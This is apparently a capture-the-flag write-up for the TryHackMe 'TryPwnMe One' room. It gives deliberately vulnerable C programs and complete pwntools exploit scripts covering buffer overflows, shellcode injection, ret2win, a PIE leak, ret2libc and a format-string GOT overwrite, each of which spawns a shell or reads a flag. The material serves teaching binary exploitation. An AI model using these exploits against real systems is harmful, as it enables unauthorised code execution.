# [TryPwnMe One](https://tryhackme.com/room/trypwnmeone)

## A collection of Exploit Development challenges to practice the basic techniques of binary exploitation.

# Introduction

The below tasks contain beginner-friendly Exploit Development challenges. If you are already familiar with concepts like Buffer Overflows, Assembly, and Exploit Development in general, this challenge may fall into the easy category in terms of difficulty. On the other hand, if you are not familiar with these concepts, it can be a bit more challenging. In case you don't know where to start, you can begin by getting familiar with tools and concepts like:

- GDB(opens in new tab) or any Linux debugger of your choice
- Pwntools(opens in new tab)
- Basics of Assembly
- Buffer Overflows

## Instructions

Follow the instructions for each task and work with the associated file, remote IP, and port. You must develop an exploit and read the content of **flag.txt** on the remote service.

The challenges on this are running Ubuntu, so there will be stack alignment issues, make sure to add a ret gadget to solve it if needed.

Have some pwn (fun)!

# TryOverflowMe 1

Try to get the flag on the remote server using the following IP and Port.

<TARGET_IP> 9003

Check the reference code below to understand what the binary is doing.

```c
int main(){
    setup();
    banner();
    int admin = 0;
    char buf[0x10];

    puts("PLease go ahead and leave a comment :");
    gets(buf);

    if (admin){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        char ch;
        while ((ch = fgetc(file)) != EOF) {
            putchar(ch);
    }
    fclose(file);
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

### What is the content of the file flag.txt on the target?

1. Run the exploit script. It brute-forces the padding length starting at 16 bytes, appending `\x01` as the non-zero value for `admin`. The first response that does not contain "Bye bye" reveals the correct offset.

```py
from pwn import *

for i in range(16, 48):
    p = remote('<TARGET_IP>', 9003)
    p.recvuntil(b':')
    p.sendline(b'A' * i + b'\x01')
    resp = p.recvall()
    if b'Bye bye' not in resp:
        print(f"[+] Offset {i} worked!")
        print(resp.decode())
        break
    p.close()
    print(f"[-] {i} failed")
```

<img width="512" height="453" alt="SCREEN01" src="https://github.com/user-attachments/assets/53afb48a-fdc9-4064-b933-da759e1663f6" />

---

# TryOverflowMe 2

Try to get the flag on the remote server using the following IP and Port.

<TARGET_IP> 9004

Check the reference code below to understand what the binary is doing.

```c
int read_flag(){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        if(!file){
            puts("the file flag.txt is not in the current directory, please contact support\n");
            exit(1);
        }
        char ch;
        while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }
    fclose(file);
}

int main(){

    setup();
    banner();
    int admin = 0;
    int guess = 1;
    int check = 0;
    char buf[64];

    puts("Please Go ahead and leave a comment :");
    gets(buf);

    if (admin==0x59595959){
            read_flag();
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

### What is the content of the file flag.txt on the target?

1. Run the exploit script. `p32(0x59595959)` packs the integer as a 4-byte little-endian value exactly the representation the C `==` comparison checks.

```py
from pwn import *

for i in range(64, 100):
    p = remote('<TARGET_IP>', 9004)
    p.recvuntil(b':')
    p.sendline(b'A' * i + p32(0x59595959))
    resp = p.recvall()
    if b'Bye bye' not in resp:
        print(f"[+] Offset {i} worked!")
        print(resp.decode())
        break
    p.close()
    print(f"[-] {i} failed")
```

<img width="512" height="458" alt="SCREEN02" src="https://github.com/user-attachments/assets/1ae24727-d351-4001-95ad-011a5e0a7124" />

---

### TryExecMe

Develop an exploit and try to get the flag on the remote server using the following IP and Port.

<TARGET_IP> 9005

Check the reference code below to understand what the binary is doing.

```c
int main(){
    setup();
    banner();
    char *buf[128];

    puts("\nGive me your shell, and I will execute it: ");
    read(0,buf,sizeof(buf));
    puts("\nExecuting Spell...\n");

    ( ( void (*) () ) buf) ();

}
```

1. Run the exploit. `context.arch = 'amd64'` tells pwntools to generate 64-bit shellcode. `shellcraft.sh()` produces a minimal `execve("/bin/sh", ...)` stub, and `asm()` assembles it to raw bytes ready for injection.

```py
from pwn import *

# Connect to the service
p = remote('<TARGET_IP>', 9005)

# Use pwntools' built-in shellcraft for the target arch
context.arch = 'amd64'

# Spawn a shell
shellcode = asm(shellcraft.sh())

p.recvuntil(b': ')
p.sendline(shellcode)
p.recvuntil(b'...\n')
# type 'cat flag.txt'
p.interactive()
```

<img width="495" height="162" alt="SCREEN03" src="https://github.com/user-attachments/assets/3e052530-2d7c-4ea9-95b2-a1045fb4403f" />

---

# TryRetMe

Develop an exploit and try to get the flag on the remote server using the following IP and Port.

<TARGET_IP> 9006

Check the reference code below to understand what the binary is doing.

```c
int win(){

    system("/bin/sh");
}

void vuln(){
    char *buf[0x20];
    puts("Return to where? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    vuln();
}
```

### What is the content of the file flag.txt on the target?

1. Run the exploit.

```py
from pwn import *

elf = ELF('./tryretme')
context.binary = elf

p = remote('<TARGET_IP>', 9006)

win_addr  = elf.symbols['win']
# for stack alignment
ret_gadget = next(elf.search(asm('ret')))

# 256 + 8 = 264
offset = 0x20 * 8 + 8

payload  = b'A' * offset
# align stack (Ubuntu system() requirement)
payload += p64(ret_gadget)
# overwrite return address -> win()
payload += p64(win_addr)

p.recvuntil(b': ')
p.sendline(payload)
p.recvuntil(b'go!\n')
p.interactive()
```

<img width="509" height="295" alt="SCREEN04" src="https://github.com/user-attachments/assets/202e9de1-61f5-4081-8e00-39435a205a69" />

---

# Random Memories

Develop an exploit and try to get the flag on the remote server using the following IP and Port.

<TARGET_IP> 9007

Check the reference code below to understand what the binary is doing.

```c
int win(){
    system("/bin/sh\0");
}

void vuln(){
    char *buf[0x20];
    printf("I can give you a secret %llx\n", &vuln);
    puts("Where are we going? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    banner();
    vuln();
}
```

### What is the content of the file flag.txt on the target?

1. Run the exploit.

```py
from pwn import *

elf = ELF('./random')
context.binary = elf

p = remote('<TARGET_IP>', 9007)

# Grab the leaked vuln address
p.recvuntil(b'secret ')
leaked_vuln = int(p.recvline().strip(), 16)

# Calculate PIE base and win() address
base     = leaked_vuln - elf.symbols['vuln']
win_addr = base + elf.symbols['win']
ret_gadget = base + next(elf.search(asm('ret')))

# Build payload
# 264 bytes to return address
offset  = 0x20 * 8 + 8
payload  = b'A' * offset
# stack alignment
payload += p64(ret_gadget)
payload += p64(win_addr)

p.recvuntil(b': ')
p.sendline(payload)
p.recvuntil(b'go!\n')
# cat flag.txt
p.interactive()
```

<img width="493" height="296" alt="SCREEN05" src="https://github.com/user-attachments/assets/e3e1e999-1781-436c-b42f-4a1d4ad7d5d1" />

---

# The Librarian

Develop an exploit and try to get the flag on the remote server using the following IP and Port.

<TARGET_IP> 9008

Check the reference code below to understand what the binary is doing. (This binary needs to be executed in the same directory of the libraries provided)

```c
void vuln(){
    char *buf[0x20];
    puts("Again? Where this time? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
    }

int main(){
    setup();
    vuln();

}
```

### What is the content of the file flag.txt on the target?

1. Build and run the two-stage exploit.

```py
from pwn import *

binary_file = './thelibrarian'
libc = ELF('./libc.so.6')

p = remote('<TARGET_IP>', 9008)

context.binary = binary = ELF(binary_file, checksec=False)
rop = ROP(binary)

padding = b"A" * 264

payload  = padding
# stack alignment for puts()
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
# loop back to main
payload += p64(binary.symbols.main)

p.recvuntil(b"Again? Where this time? : \n")
p.sendline(payload)
p.recvuntil(b"ok, let's go!\n\n")

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'Puts leak => {hex(leak)}')

# Calculate addresses
libc.address = leak - libc.symbols.puts
log.info(f'Libc base => {hex(libc.address)}')

bin_sh = libc.address + 0x1b3d88
system = libc.address + 0x4f420

log.info(f'/bin/sh => {hex(bin_sh)}')
log.info(f'system  => {hex(system)}')

# system("/bin/sh")
payload2  = padding
payload2 += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload2 += p64(bin_sh)
payload2 += p64(system)
payload2 += p64(rop.find_gadget(['ret'])[0])
payload2 += p64(0x0)

p.recvuntil(b"Again? Where this time? : \n")
p.sendline(payload2)
p.recvuntil(b"ok, let's go!\n\n")
p.interactive()
```

<img width="486" height="402" alt="SCREEN06" src="https://github.com/user-attachments/assets/98514032-b302-425f-b247-40d60b9fe109" />

---

# Not Specified

Develop an exploit and try to get the flag on the remote server using the following IP and Port.

<TARGET_IP> 9009

Check the reference code below to understand what the binary is doing.

```c
int win(){

    system("/bin/sh\0");

}

int main(){

    setup();

    banner();

    char *username[32];

    puts("Please provide your username\n");

    read(0,username,sizeof(username));

    puts("Thanks! ");

    printf(username);

    puts("\nbye\n");

    exit(1);

}
```

### What is the content of the file flag.txt on the target?

1. Run the exploit.

```py
from pwn import *

elf = ELF('./notspecified')
context.binary = elf

s = remote('<TARGET_IP>', 9009)

exit_got = elf.got['exit']
win_func = elf.symbols['win']

# offset 6: our buffer starts at the 6th format string argument on the stack
payload = fmtstr_payload(6, {exit_got: win_func})

s.recvuntil(b'\n\n')
s.sendline(payload)
s.recvuntil(b'Thanks! ')

# exit(1) redirects to win() -> system("/bin/sh")
s.interactive()  # cat flag.txt
```

<img width="991" height="370" alt="SCREEN07" src="https://github.com/user-attachments/assets/06bfce46-8ef1-4dfd-a0b6-65d0a492c3bd" />
